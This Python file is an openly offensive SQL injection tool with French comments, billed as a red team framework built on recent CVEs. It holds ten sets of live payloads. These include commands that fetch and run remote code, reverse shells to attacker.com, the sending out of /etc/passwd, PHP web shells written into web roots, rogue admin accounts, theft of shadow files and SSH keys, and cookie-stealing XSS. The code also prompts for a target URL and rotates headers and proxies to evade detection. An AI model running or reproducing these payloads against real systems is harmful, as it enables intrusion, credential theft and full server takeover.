#!/usr/bin/env python3
"""
🔴⚫ ULTRA-ADVANCED RED TEAM SQL INJECTION FRAMEWORK ⚫🔴
Based on National Vulnerability Database 2024-2025
CVSS 9.9 Critical Severity Attacks Only
"""

import requests
import time
import sys
import urllib.parse
from urllib.parse import urljoin, urlparse
import json
import random
import base64
import hashlib
import threading
from datetime import datetime
import re
from io import BytesIO
import urllib3
import os
import subprocess
import uuid
from pathlib import Path
try:
    from PIL import Image
except ImportError:
    Image = None
try:
    import pytesseract
except ImportError:
    pytesseract = None
try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'
    BLACK = '\033[30m'
    BG_RED = '\033[41m'
    BG_BLACK = '\033[40m'
    BLINK = '\033[5m'

class UltraAdvancedSQLInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none'
        })
        self.logged_in = False
        self.verify = True
        # Resilience config
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0'
        ]
        self.accept_languages = ['en-US,en;q=0.9', 'fr-FR,fr;q=0.8,en;q=0.6']
        self.accept_headers = [
            'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'text/html,application/json;q=0.9,*/*;q=0.8'
        ]
        self.proxy_pool = []  # ex: ['http://user:pass@ip:port', 'socks5://ip:port']
        self.retry_statuses = {429, 502, 503, 504}
        self.base_delay_ms = 600
        self.max_retries = 4
        self.recent_503 = 0
        # Catégories -> clés d'attaques suggérées (mapping souple)
        self.category_map = {
            'bypass': ['1', '3', '7', '9'],  # blind/time-based, multibyte bypass, WAF evasion
            'insert': ['2', '4', '6', '8', '10'],  # file ops, RCE chains, stored/second-order
            'privilege': ['1', '5', '6', '8'],  # extraction + DB-specific
            'discovery': ['5', '9', '10'],  # info gathering/exfil polyglot
        }
        self.last_schema_hints = {}
        self.selected_category = ''
        
        # 🔴⚫ ARSENAL D'ATTAQUES CRITIQUES CVSS 9.9 ⚫🔴
        self.attack_arsenal = {
            '1': {
                'name': '🔴 CVE-2024-42327 Zabbix-Style Critical Blind',
                'description': 'Attaque inspirée de CVE-2024-42327 (CVSS 9.9) - Escalade privilèges via blind SQL',
                'severity': 'CRITICAL',
                'cvss': '9.9',
                'payloads': [
                    "'; IF((ASCII(SUBSTRING((SELECT TOP 1 name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msdb')),1,1)))>64,WAITFOR DELAY '0:0:5',WAITFOR DELAY '0:0:0')--",
                    "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4)t WHERE (ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),1,1)))>96)>0; WAITFOR DELAY '0:0:5'--",
                    "'; DECLARE @query NVARCHAR(4000); SET @query = N'IF (1=(SELECT COUNT(*) FROM information_schema.tables)) WAITFOR DELAY ''0:0:5'''; EXEC sp_executesql @query--",
                    "' OR (SELECT COUNT(*) FROM (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT database()),1,1)))>100 THEN BENCHMARK(5000000,MD5(1)) ELSE 0 END)x)>0--",
                    "'; WITH RECURSIVE extractdata(pos, ch) AS (SELECT 1, ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) UNION ALL SELECT pos+1, ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),pos+1,1)) FROM extractdata WHERE pos<32) SELECT CASE WHEN ch>96 THEN pg_sleep(5) ELSE pg_sleep(0) END FROM extractdata WHERE pos=1--"
                ]
            },
            '2': {
                'name': '⚫ CVE-2024-23119 Centreon-Style RCE Chain',
                'description': 'Chaîne d\'exploitation basée sur CVE-2024-23119 - RCE via SQL injection',
                'severity': 'CRITICAL',
                'cvss': '9.8',
                'payloads': [
                    "'; EXEC xp_cmdshell 'powershell -c \"IEX(IWR http://attacker.com/stage1.ps1 -UseBasicParsing)\"';--",
                    "' UNION SELECT '<?php system($_GET[\"c\"]); unlink(__FILE__); ?>',2,3 INTO OUTFILE '/var/www/html/sh3ll.php'--",
                    "'; INSERT INTO mysql.user (Host,User,authentication_string,ssl_cipher,x509_issuer,x509_subject) VALUES('%','redteam',PASSWORD('pwn3d'),'','',''); FLUSH PRIVILEGES;--",
                    "' UNION SELECT load_file('/etc/passwd'),load_file('/etc/shadow'),load_file('/root/.ssh/id_rsa'),4 INTO OUTFILE '/tmp/loot.txt'--",
                    "'; CREATE OR REPLACE FUNCTION exec_shell(text) RETURNS text AS $$ import subprocess; return subprocess.check_output($1.split()).decode() $$ LANGUAGE plpython3u; SELECT exec_shell('whoami');--"
                ]
            },
            '3': {
                'name': '🔴 CVE-2025-1094 PostgreSQL Multibyte Bypass',
                'description': 'Exploitation de CVE-2025-1094 - Bypass via caractères multibytes invalides',
                'severity': 'CRITICAL', 
                'cvss': '9.1',
                'payloads': [
                    "\xc0\x27 UNION SELECT password,2,3 FROM users--",  # Invalid UTF-8 sequence
                    "\xe0\x80\x27 OR 1=1--",  # Overlong encoding
                    "\xf0\x82\x82\x27 AND (SELECT pg_read_file('/etc/passwd'))--",  # 4-byte overlong
                    "\\x5c\\x27 UNION SELECT current_setting('data_directory'),2--",  # Hex escape bypass
                    "\xfe\xff\x00\x27 OR pg_sleep(5)--",  # BOM + null byte
                    "\xc1\xbf\x27; COPY (SELECT * FROM users) TO '/tmp/pwn.csv';--",  # Modified UTF-8
                    "\xed\xa0\x80\x27 UNION SELECT encode(password::bytea,'base64') FROM users--"  # Surrogate half
                ]
            },
            '4': {
                'name': '⚫ CVE-2024-9264 Grafana-Style Critical Chain',
                'description': 'Exploitation critique inspirée de CVE-2024-9264 (CVSS 9.9)',
                'severity': 'CRITICAL',
                'cvss': '9.9',
                'payloads': [
                    "'; SELECT writefile('/var/www/html/pwn.php', '<?php eval($_POST[x]); ?>'); PRAGMA temp_store_directory='/var/www/html';--",
                    "' UNION SELECT tbl_name,sql,type FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'--",
                    "'; ATTACH DATABASE '/dev/shm/evil.db' AS evil; CREATE TABLE evil.shell AS SELECT '<?php system($_GET[c]); ?>' AS data; SELECT writefile('/var/www/html/cmd.php', data) FROM evil.shell;--",
                    "' OR LOAD_EXTENSION('/lib/x86_64-linux-gnu/libc.so.6','system'); SELECT system('curl attacker.com/rev.sh|bash');--",
                    "'; INSERT INTO sqlite_master(type,name,tbl_name,rootpage,sql) VALUES('table','pwned','pwned',0,'CREATE TABLE pwned(data TEXT)'); INSERT INTO pwned VALUES('<?php passthru($_GET[c]); ?>'); SELECT writefile('/var/www/html/backdoor.php',(SELECT data FROM pwned));--"
                ]
            },
            '5': {
                'name': '🔴 Advanced Boolean Oracle Extraction',
                'description': 'Extraction binaire ultra-sophistiquée avec optimisation temporelle',
                'severity': 'CRITICAL',
                'cvss': '9.5',
                'payloads': [
                    "' AND (SELECT COUNT(*) FROM (SELECT 1 WHERE (ASCII(SUBSTRING((SELECT GROUP_CONCAT(username,':',password) FROM users),{},1)))&128>0)x)>0--",
                    "' OR (SELECT CASE WHEN (ASCII(SUBSTRING(@@version,{},1))&{})>0 THEN (SELECT COUNT(*) FROM information_schema.columns) ELSE 0 END)>100--",
                    "' AND BINARY SUBSTRING((SELECT password FROM users WHERE username='admin'),{},1) RLIKE '^[{}-{}]'--",
                    "' OR (SELECT COUNT(*) FROM dual WHERE BITAND(ASCII(SUBSTR((SELECT banner FROM v$version WHERE rownum=1),{},1)),{}))>0--",
                    "' AND EXISTS(SELECT 1 FROM pg_user WHERE (ASCII(SUBSTRING(usename,{},1))>>{}&1)=1)--"
                ]
            },
            '6': {
                'name': '⚫ Database-Specific 0-Day Exploitation',
                'description': 'Attaques spécialisées par SGBD avec techniques 0-day',
                'severity': 'CRITICAL',
                'cvss': '9.8',
                'payloads': [
                    # MySQL 8.0+ Advanced
                    "'; SET GLOBAL general_log = 'ON'; SET GLOBAL general_log_file = '/var/www/html/mysql_shell.php'; SELECT '<?php system($_GET[\"c\"]); ?>' AS '';--",
                    "'; CREATE FUNCTION sys_eval RETURNS STRING SONAME 'lib_mysqludf_sys.so'; SELECT sys_eval('bash -i >& /dev/tcp/attacker.com/4444 0>&1');--",
                    
                    # PostgreSQL 13+ Advanced
                    "'; CREATE OR REPLACE FUNCTION reverse_shell() RETURNS void AS $$ import socket,subprocess,os; s=socket.socket(); s.connect((\"attacker.com\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/sh\",\"-i\"]); $$ LANGUAGE plpython3u;--",
                    "'; COPY (SELECT '') TO PROGRAM 'curl -X POST -d @/etc/passwd http://attacker.com/exfil';--",
                    
                    # MSSQL 2019+ Advanced  
                    "'; EXEC sp_configure 'Agent XPs', 1; RECONFIGURE; EXEC msdb.dbo.sp_add_job @job_name='pwn'; EXEC msdb.dbo.sp_add_jobstep @job_name='pwn', @command='powershell -enc <base64_reverse_shell>';--",
                    "'; BULK INSERT temp FROM '\\\\attacker.com\\share\\passwords.txt' WITH (FIELDTERMINATOR=',', ROWTERMINATOR='\\n');--",
                    
                    # Oracle 19c+ Advanced
                    "'; DECLARE v_result NUMBER; BEGIN SELECT UTL_HTTP.request('http://attacker.com/oracle_pwned?data='||RAWTOHEX(UTL_RAW.cast_to_raw((SELECT password FROM users WHERE rownum=1)))) INTO v_result FROM dual; END;--"
                ]
            },
            '7': {
                'name': '🔴 WAF Evasion Zero-Day Techniques',
                'description': 'Techniques de contournement WAF avec méthodes 0-day',
                'severity': 'CRITICAL',
                'cvss': '9.7',
                'payloads': [
                    "1'/**/UNI%0AON/**/ALL/**/SEL%0AECT/**/CONCAT(0x3c3f7068702073797374656d28245f4745545b2263225d293b203f3e),2,3/**/INTO/**/OUTFILE/**/'{}shell.php'--",
                    "1'/*!12345UNION*//*!12345ALL*//*!12345SELECT*//*!12345CONCAT*/(username,0x3a,password),2,3/**/FROM/**/users--",
                    "1'||(SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema=database()))||'",
                    "1';{fn+CONVERT('SELECT password FROM users',SQL_LONGVARCHAR)}--",
                    "1'+(SELECT+CASE+WHEN+(1=1)+THEN+'UNION'+ELSE+'1234567890'+END)+(SELECT+CASE+WHEN+(1=1)+THEN+'SELECT'+ELSE+'1234567890'+END)+password+FROM+users--",
                    "1'UNION(SELECT(1),GROUP_CONCAT(CONCAT_WS(0x3a,username,password)),3)FROM(users))--",
                    "1'%0AUNION%0DALL%0ASELECT%0A(SELECT%0AGROUP_CONCAT(username,0x3a,password)FROM%0Ausers),2,3--"
                ]
            },
            '8': {
                'name': '⚫ Second-Order & Stored Injection Advanced',
                'description': 'Injections de second ordre ultra-sophistiquées',
                'severity': 'CRITICAL',
                'cvss': '9.6',
                'payloads': [
                    "admin'+(SELECT+CONCAT(0x3c3f7068702073797374656d28245f4745545b63225d293b203f3e)+FROM+dual)+'",
                    "user';DELIMITER$$;CREATE TRIGGER backdoor BEFORE INSERT ON logs FOR EACH ROW BEGIN IF NEW.message='activate' THEN SET @cmd=CONCAT('SELECT \"',LOAD_FILE('/etc/passwd'),'\"'); END IF;END$$;DELIMITER;--",
                    "comment'/**/;/**/INSERT/**/INTO/**/users(username,password,role)/**/VALUES('redteam',MD5('pwn3d'),'admin');--",
                    "title';CREATE EVENT IF NOT EXISTS backdoor ON SCHEDULE AT CURRENT_TIMESTAMP + INTERVAL 10 SECOND DO BEGIN INSERT INTO users VALUES('ghost','$2y$10$HashedPassword','admin'); END;--",
                    "description'||CHR(39)||'+(SELECT+password+FROM+users+WHERE+id=1)+CHR(39)||'; UPDATE users SET password='$2y$10$NewAdminHash' WHERE role='admin'||CHR(39)||'",
                    "field';WITH admin_data AS (SELECT CONCAT(username,':',password_hash) as creds FROM admin_users) INSERT INTO logs SELECT CONCAT('STOLEN: ', creds) FROM admin_data;--",
                    "data'; CREATE FUNCTION pwn() RETURNS TEXT AS $$ import os; return os.popen('cat /etc/passwd').read() $$ LANGUAGE plpython3u; SELECT pwn() INTO OUTFILE '/var/www/html/passwd.txt';--"
                ]
            },
            '9': {
                'name': '🔴 Advanced Time-Based with ML Evasion',
                'description': 'Time-based avec techniques d\'évasion Machine Learning',
                'severity': 'CRITICAL',
                'cvss': '9.4',
                'payloads': [
                    "'; IF((SELECT COUNT(*) FROM users WHERE LENGTH(password)={})>0,(SELECT BENCHMARK({}000000,MD5('{}'))),0); SELECT SLEEP({});--",
                    "' AND IF((ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{},1)))={},(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C),0)--",
                    "'; DECLARE @start DATETIME; SET @start=GETDATE(); WHILE DATEDIFF(MILLISECOND,@start,GETDATE())<{} BEGIN SET @start=@start; END; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),{},1)))>{} WAITFOR DELAY '0:0:{}';--",
                    "' OR (SELECT * FROM (SELECT(SLEEP({}-(IF((SELECT MID(version(),{},1))='{}', 0, {}))))x WHERE RAND()>0.5)--",
                    "'; WITH RECURSIVE timing(n) AS (SELECT 1 UNION ALL SELECT n+1 FROM timing WHERE n<{}) SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE id=1),{},1)))>{} THEN pg_sleep(5) ELSE COUNT(*) END FROM timing;--"
                ]
            },
            '10': {
                'name': '⚫ Polyglot Multi-Context Exploitation',
                'description': 'Injections polyglotte pour exploitation multi-contexte',
                'severity': 'CRITICAL',
                'cvss': '9.9',
                'payloads': [
                    "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";SELECT password FROM users WHERE username='admin'--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
                    "1'UNION+SELECT+CONCAT('<script>fetch(\"http://attacker.com/steal?cookie=\"+document.cookie)</script>',password,'<img src=x onerror=eval(atob(\"{}=\"))>'),2,3+FROM+users--",
                    "admin';INSERT INTO logs VALUES('<iframe src=\"javascript:eval(String.fromCharCode({}))\"></iframe>',(SELECT password FROM users WHERE username='admin'));--",
                    "1'||JSON_EXTRACT(JSON_OBJECT('xss',CONCAT('<svg/onload=eval(atob(\"',TO_BASE64('fetch(\"http://attacker.com?data=\"+btoa(JSON.stringify(document.cookie)))'),'\"\"))>'),password),\"$.xss\")||'",
                    "user'+(SELECT+GROUP_CONCAT(CONCAT('<img src=\"http://attacker.com/pixel.gif?data=',password,'\" onerror=\"eval(atob(\\'{}\\')); this.src=null\">'))FROM+users)+'",
                    "';SET @payload=CONCAT('<?xml version=\"1.0\"?><root><![CDATA[<script>location.href=\"http://attacker.com/steal?data=\"+btoa(',QUOTE((SELECT password FROM users WHERE id=1)),');</script>]]></root>'); SELECT @payload INTO OUTFILE '/var/www/html/exploit.xml';--"
                ]
            }
        }

    def display_banner(self):
        """Affiche la bannière ultra-menaçante"""
        print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD}{Colors.BLINK}")
        print("=" * 90)
        print("  🔴⚫ ULTRA-ADVANCED RED TEAM SQL INJECTION FRAMEWORK 2025 ⚫🔴")
        print("        💀 BASED ON NATIONAL VULNERABILITY DATABASE 💀")
        print("         ⚡ CVSS 9.9 CRITICAL SEVERITY ATTACKS ONLY ⚡")
        print("=" * 90)
        print(f"{Colors.END}")
        
        print(f"{Colors.RED}{Colors.BOLD}⚠️  EXTREME DANGER - MILITARY GRADE WEAPONS ⚠️{Colors.END}")
        print(f"{Colors.YELLOW}📊 Basé sur les CVE critiques 2024-2025:{Colors.END}")
        print(f"{Colors.CYAN}   • CVE-2024-42327 (Zabbix) - CVSS 9.9{Colors.END}")
        print(f"{Colors.CYAN}   • CVE-2024-23119 (Centreon) - CVSS 9.8{Colors.END}")
        print(f"{Colors.CYAN}   • CVE-2025-1094 (PostgreSQL) - CVSS 9.1{Colors.END}")
        print(f"{Colors.CYAN}   • CVE-2024-9264 (Grafana) - CVSS 9.9{Colors.END}")
        print(f"{Colors.RED}💀 CES ATTAQUES PEUVENT COMPROMETTRE TOTALEMENT LES SYSTÈMES 💀{Colors.END}\n")

    def display_attack_arsenal(self, allowed_keys=None):
        """Affiche l'arsenal d'attaques"""
        print(f"{Colors.BOLD}🎯 ARSENAL D'ATTAQUES CRITIQUES (CVE 2024-2025):{Colors.END}\n")
        
        for key, attack in self.attack_arsenal.items():
            if allowed_keys and key not in allowed_keys:
                continue
            if 'CVE-2024' in attack['name'] or 'CVE-2025' in attack['name']:
                color = f"{Colors.RED}{Colors.BOLD}"
            else:
                color = f"{Colors.BLACK}{Colors.BG_RED}{Colors.BOLD}"
                
            print(f"{color}{key.rjust(2)}.{Colors.END} {color}{attack['name']}{Colors.END}")
            print(f"    💀 {attack['description']}")
            print(f"    ⚡ CVSS Score: {Colors.RED}{Colors.BOLD}{attack['cvss']}{Colors.END}")
            print(f"    🎯 Sévérité: {Colors.RED}{Colors.BOLD}{attack['severity']}{Colors.END}")
            print(f"    💣 Payloads: {Colors.BOLD}{len(attack['payloads'])}{Colors.END} attaques létales")
            print()

    def get_target_info(self):
        """Interface utilisateur pour sélection d'attaque"""
        # Choix du type d'attaque
        print(f"{Colors.BOLD}🎛️ Type d'attaque disponible:{Colors.END}")
        print("1. Bypass login (contourner authentification)")
        print("2. Insert (création/ajout: ex. crédit)")
        print("3. Upgrade privilege (élévation de privilèges)")
        print("4. Discovery/Recon (info/exfil)")
        category_choice = '1'
        try:
            c = input(f"{Colors.RED}{Colors.BOLD}🎯 Type d'attaque (1-4): {Colors.END}").strip()
            if c in ['1','2','3','4']:
                category_choice = c
        except KeyboardInterrupt:
            pass
        category_key = {'1':'bypass','2':'insert','3':'privilege','4':'discovery'}[category_choice]
        self.selected_category = category_key
        allowed_keys = self.category_map.get(category_key, list(self.attack_arsenal.keys()))
        while True:
            try:
                print(f"{Colors.GREEN}{Colors.BOLD} OU entrez 'EXIT' pour leave.")
                print(f"{Colors.YELLOW}📋 Filtré pour: {category_key}{Colors.END}")
                self.display_attack_arsenal(allowed_keys)
                choice = input(f"{Colors.RED}{Colors.BOLD}🎯 Sélectionnez l'arme CVE: {Colors.END}").strip()
                if choice in self.attack_arsenal and (choice in allowed_keys):
                    break
                elif "exit" or "EXIT" in choice:
                    sys.exit()
                else:
                    print(f"{Colors.RED}❌ Choix invalide pour cette catégorie.{Colors.END}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🏃 Extraction d'urgence...{Colors.END}")
                sys.exit(0)
        
        while True:
            try:
                url = input(f"{Colors.RED}{Colors.BOLD}🎯 URL de la cible: {Colors.END}").strip()
                if url:
                    if not url.startswith(('http://', 'https://')):
                        url = 'https://' + url  # Force HTTPS par défaut
                    
                    parsed = urlparse(url)
                    if parsed.netloc:
                        break
                    else:
                        print(f"{Colors.RED}❌ Format d'URL invalide.{Colors.END}")
                else:
                    print(f"{Colors.RED}❌ L'URL ne peut pas être vide.{Colors.END}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🏃 Extraction d'urgence...{Colors.END}")
                sys.exit(0)
        
        print(f"\n{Colors.BOLD}🔥 MODES D'ENGAGEMENT DISPONIBLES:{Colors.END}")
        print("1. 💣 Strike Standard (payloads CVE)")
        print("2. ⚡ Red Team Annihilation (variations ultra-avancées)")
        print("3. 🌪️ ML-Enhanced Evasion (contournement IA)")
        
        while True:
            try:
                mode = input(f"{Colors.RED}{Colors.BOLD}🎯 Mode d'engagement (1-3): {Colors.END}").strip()
                if mode in ['1', '2', '3']:
                    break
                else:
                    print(f"{Colors.RED}❌ Choix invalide. Sélectionnez 1-3.{Colors.END}")
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}🏃 Extraction d'urgence...{Colors.END}")
                sys.exit(0)
        
        return choice, url, mode

    def _find_login_form(self, soup, selector_override=None):
        """Retourne (form, inputs) si un formulaire avec champ password est trouvé"""
        # Heuristiques étendues: champs password OU noms usuels OU sélecteur explicite
        if selector_override:
            try:
                form = soup.select_one(selector_override)
                if form:
                    inputs = form.find_all(["input", "select", "textarea"]) or []
                    return form, inputs
            except Exception:
                pass
        # Essai direct d'une classe fréquente
        try:
            form = soup.select_one('form.form-login')
            if form:
                inputs = form.find_all(["input", "select", "textarea"]) or []
                return form, inputs
        except Exception:
            pass
        # Heuristiques génériques
        password_name_patterns = re.compile(r"pass|passwd|password|pwd", re.I)
        username_name_patterns = re.compile(r"user|login|email|mail|ident", re.I)
        for form in soup.find_all("form"):
            inputs = form.find_all(["input", "select", "textarea"]) or []
            has_password = any(((i.get("type") or "").lower() == "password") or password_name_patterns.search(i.get("name") or "") for i in inputs)
            # Match par classe/id/action indicatifs
            form_id = (form.get("id") or "").lower()
            form_cls = " ".join(form.get("class") or []).lower()
            form_action = (form.get("action") or "").lower()
            looks_like_login = (
                "login" in form_id or "connexion" in form_id or
                "login" in form_cls or "form-login" in form_cls or "signin" in form_cls or
                "login" in form_action or "sign" in form_action
            )
            if has_password or looks_like_login:
                # Prioriser le formulaire avec submit/login
                submits = form.find_all("button") + form.find_all("input", {"type": "submit"})
                if submits:
                    return form, inputs
                # Sinon retourner quand même
                return form, inputs
        return None, None

    def _ensure_dir(self, path: Path):
        try:
            path.mkdir(parents=True, exist_ok=True)
        except Exception:
            pass

    def _choose_rotating_headers(self):
        try:
            ua = random.choice(self.user_agents) if self.user_agents else None
            al = random.choice(self.accept_languages) if self.accept_languages else None
            ac = random.choice(self.accept_headers) if self.accept_headers else None
            headers = {}
            if ua:
                headers['User-Agent'] = ua
            if al:
                headers['Accept-Language'] = al
            if ac:
                headers['Accept'] = ac
            # Occasionally add X-Requested-With to mimic AJAX
            if random.random() < 0.3:
                headers['X-Requested-With'] = 'XMLHttpRequest'
            return headers
        except Exception:
            return {}

    def _choose_proxy(self):
        try:
            if not self.proxy_pool:
                return None
            p = random.choice(self.proxy_pool)
            return {'http': p, 'https': p}
        except Exception:
            return None

    def _adaptive_sleep(self, base_delay_ms):
        # Increase delay when 503 recently encountered
        try:
            jitter = random.randint(100, 400)
            factor = 1 + min(self.recent_503, 5) * 0.5
            delay = int(base_delay_ms * factor) + jitter
            time.sleep(delay / 1000.0)
        except Exception:
            time.sleep(base_delay_ms / 1000.0)

    def _send_with_resilience(self, method, url, **kwargs):
        # Rotating headers and proxies per attempt
        attempt = 0
        last_exc = None
        while attempt <= self.max_retries:
            attempt += 1
            merged_headers = dict(self.session.headers)
            merged_headers.update(kwargs.pop('headers', {}) or {})
            merged_headers.update(self._choose_rotating_headers())
            proxies = kwargs.pop('proxies', None) or self._choose_proxy()
            timeout = kwargs.get('timeout', 20)
            kwargs['timeout'] = timeout
            try:
                resp = self.session.request(method, url, headers=merged_headers, proxies=proxies, verify=self.verify, allow_redirects=True, **kwargs)
                # Record 503 streak
                if resp.status_code == 503:
                    self.recent_503 = min(self.recent_503 + 1, 10)
                else:
                    self.recent_503 = max(self.recent_503 - 1, 0)
                # Retry on retryable statuses
                if resp.status_code in self.retry_statuses:
                    retry_after = resp.headers.get('Retry-After')
                    if retry_after:
                        try:
                            ra = int(retry_after)
                            time.sleep(min(ra, 10))
                        except Exception:
                            self._adaptive_sleep(self.base_delay_ms)
                    else:
                        self._adaptive_sleep(self.base_delay_ms)
                    if attempt <= self.max_retries:
                        continue
                return resp
            except requests.RequestException as e:
                last_exc = e
                self._adaptive_sleep(self.base_delay_ms)
                continue
        if last_exc:
            raise last_exc
        raise requests.RequestException('Request failed without explicit exception')

    def _get_baseline_response(self, url):
        try:
            r = self._send_with_resilience('GET', url)
            return r, r.text.lower() if hasattr(r, 'text') else ''
        except Exception as e:
            return None, ''

    def _probe_reflection(self, url, param_name):
        try:
            marker = f"X{uuid.uuid4().hex[:6]}Y"
            test_url = url
            sep = '&' if ('?' in url) else '?'
            test_url = f"{url}{sep}{param_name}={urllib.parse.quote(marker)}"
            r = self._send_with_resilience('GET', test_url)
            t = (r.text or '').lower()
            return marker.lower() in t
        except Exception:
            return False

    def _discover_column_count(self, url, param_name, max_cols=8):
        # Try UNION NULLs first
        for n in range(1, max_cols + 1):
            nulls = ','.join(['NULL'] * n)
            payload = f"' UNION SELECT {nulls}--"
            sep = '&' if ('?' in url) else '?'
            test_url = f"{url}{sep}{param_name}={urllib.parse.quote(payload)}"
            try:
                r = self._send_with_resilience('GET', test_url)
                # Heuristic: 2xx and larger content than typical DOCTYPE-only
                if r.status_code < 500 and (len(r.text or '') > 200):
                    return n
            except Exception:
                continue
        # Fallback: ORDER BY probes
        base_r, base_text = self._get_baseline_response(url)
        for n in range(1, max_cols + 1):
            payload = f"' ORDER BY {n}--"
            sep = '&' if ('?' in url) else '?'
            test_url = f"{url}{sep}{param_name}={urllib.parse.quote(payload)}"
            try:
                r = self._send_with_resilience('GET', test_url)
                if r.status_code >= 500:
                    return max(1, n - 1)
            except Exception:
                return max(1, n - 1)
        return 0

    def smart_union_dump(self, base_url, table, columns, limit=100):
        """Essaie d'extraire des lignes via UNION SELECT avec détection de colonne et réflexion."""
        # Candidate parameter names commonly reflected
        candidate_params = ['q', 'search', 's', 'id', 'user', 'name']
        # Ensure base_url has no query for clean appends
        url = base_url.split('#')[0]
        url = url if '?' not in url else url.split('?')[0]
        # Choose a parameter that reflects
        chosen = None
        for p in candidate_params:
            if self._probe_reflection(url, p):
                chosen = p
                break
        if not chosen:
            # Try without reflection; pick first candidate
            chosen = candidate_params[0]
        # Discover column count
        col_count = self._discover_column_count(url, chosen)
        if col_count <= 0:
            return []

    def quick_execute_sql(self, url, sql, method='GET', param_name='q'):
        """Exécute rapidement un payload SQL sur une URL et affiche un extrait."""
        try:
            if method.upper() == 'POST':
                data = {param_name: sql}
                start = time.time()
                resp = self._send_with_resilience('POST', url, data=data)
            else:
                sep = '&' if ('?' in url) else '?'
                target = f"{url}{sep}{param_name}={urllib.parse.quote(sql)}"
                start = time.time()
                resp = self._send_with_resilience('GET', target)
            elapsed_ms = (time.time() - start) * 1000
            fbl = self._record_full_battle_log(resp, url, method.upper(), sql, elapsed_ms)
            print(f"Status: {resp.status_code} | Time: {round(elapsed_ms,2)}ms | Size: {len(resp.content or b'')} bytes")
            # Show sample extract similar to exploit success
            try:
                sample_shown = False
                extracted_path = fbl.get('extracted')
                if extracted_path and os.path.exists(extracted_path):
                    with open(extracted_path, 'r', encoding='utf-8', errors='ignore') as f:
                        data = json.load(f)
                    rows = data.get('rows') or []
                    if isinstance(rows, list) and rows:
                        first = rows[0]
                        print(f"Extrait: {first.get('col1','')} , {first.get('col2','')}")
                        sample_shown = True
                if not sample_shown and fbl.get('text_only') and os.path.exists(fbl['text_only']):
                    with open(fbl['text_only'], 'r', encoding='utf-8', errors='ignore') as f:
                        line = f.readline().strip()
                    if line:
                        print(f"Extrait (texte): {line[:200]}")
                        sample_shown = True
                if not sample_shown and fbl.get('body_txt') and os.path.exists(fbl['body_txt']):
                    with open(fbl['body_txt'], 'r', encoding='utf-8', errors='ignore') as f:
                        chunk = f.read(200)
                    if chunk:
                        print(f"Extrait (html): {chunk.strip()}")
            except Exception:
                pass
        except Exception as e:
            print(f"{Colors.RED}❌ Erreur exécution rapide: {e}{Colors.END}")

    def _save_body_files(self, response, out_dir: Path, base_name: str):
        self._ensure_dir(out_dir)
        try:
            bin_path = out_dir / f"{base_name}.bin"
            with open(bin_path, 'wb') as f:
                f.write(response.content or b"")
        except Exception:
            bin_path = None
        txt_path = None
        try:
            # Try to decode to text using apparent encoding when not set
            if not response.encoding:
                try:
                    response.encoding = response.apparent_encoding  # type: ignore[attr-defined]
                except Exception:
                    response.encoding = 'utf-8'
            txt_path = out_dir / f"{base_name}.txt"
            with open(txt_path, 'w', encoding='utf-8', errors='ignore') as f:
                f.write(response.text or '')
        except Exception:
            txt_path = None
        return {
            'body_bin': str(bin_path) if bin_path else '',
            'body_txt': str(txt_path) if txt_path else ''
        }

    def _strip_html_to_text(self, html: str) -> str:
        try:
            if BeautifulSoup is not None:
                soup = BeautifulSoup(html, 'html.parser')
                # Remove scripts/styles
                for tag in soup(['script', 'style', 'noscript']):
                    tag.decompose()
                text = soup.get_text('\n', strip=True)
                return text
        except Exception:
            pass
        # Fallback: naive strip
        try:
            return re.sub(r'<[^>]+>', ' ', html or '')
        except Exception:
            return html or ''

    def _save_extracted_artifacts(self, response, out_dir: Path):
        paths = {}
        try:
            text = ''
            try:
                if not response.encoding:
                    response.encoding = response.apparent_encoding  # type: ignore[attr-defined]
                text = response.text or ''
            except Exception:
                text = ''
